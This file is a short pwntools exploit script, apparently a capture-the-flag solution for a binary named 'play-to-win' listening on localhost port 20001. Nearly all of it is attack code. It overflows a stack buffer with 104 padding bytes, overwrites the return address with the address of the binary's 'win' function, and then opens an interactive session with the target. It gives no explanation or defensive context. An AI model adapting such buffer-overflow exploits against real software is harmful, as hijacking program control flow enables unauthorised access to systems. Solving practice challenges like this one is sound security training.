#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 20001 ./play-to-win
from pwn import *

exe = context.binary = ELF('./play-to-win')

host = args.HOST or 'localhost'
port = int(args.PORT or 20001)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()
io.sendline(b'A' * 104 + p64(exe.sym.win))
io.interactive()
